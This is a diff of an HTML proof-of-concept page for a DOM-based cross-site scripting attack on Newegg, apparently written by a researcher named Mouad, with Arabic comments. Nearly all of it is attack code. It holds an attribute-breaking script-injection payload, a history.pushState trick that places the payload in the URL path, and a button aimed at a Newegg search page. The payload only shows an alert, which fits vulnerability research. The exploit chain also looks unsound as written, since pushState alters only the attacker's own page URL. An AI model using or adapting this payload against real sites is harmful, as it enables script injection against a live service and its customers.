@@ -1,14 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>XSS PoC</title>
+    <title>PoC - Newegg DOM XSS</title>
 </head>
-<body>
-  <h1>DOM XSS PoC</h1>
+<body style="background:#000; color:#0f0; text-align:center; padding-top:100px;">
+    <h1>Exploit Lab - Mouad</h1>
+    
+    <a id="exploit" href="#" style="padding:15px; background:red; color:white; text-decoration:none;">
+        اضغط هنا لتشغيل الهجوم (Trigger XSS)
+    </a>
 
-  <a href="https://www.newegg.com/p/pl?d=Test&GroupEss209183=Mouad">
-    Go to Newegg
-  </a>
+    <script>
+        // الـ Payload لإغلاق الوسم وحقن سكريبت
+        // نستخدم ` بدلاً من " لتجنب مشاكل الـ Encoding
+        var pld = '"><script>alert(`XSS_MOUAD_ID_`+document.domain)<\/script>';
+        
+        // بناء مسار يحتوي على الـ Payload لكي يقرأه سكريبت Newegg
+        // سنضعه بعد /VORTEX/ ليصبح جزءاً من الرابط
+        var attackPath = "/VORTEX/" + pld;
+
+        // تغيير العنوان في المتصفح ليحتوي على الـ Payload
+        window.history.pushState({}, '', attackPath);
+
+        // توجيه الزر إلى Newegg
+        document.getElementById('exploit').href = "https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad";
+    </script>
 </body>
 </html>
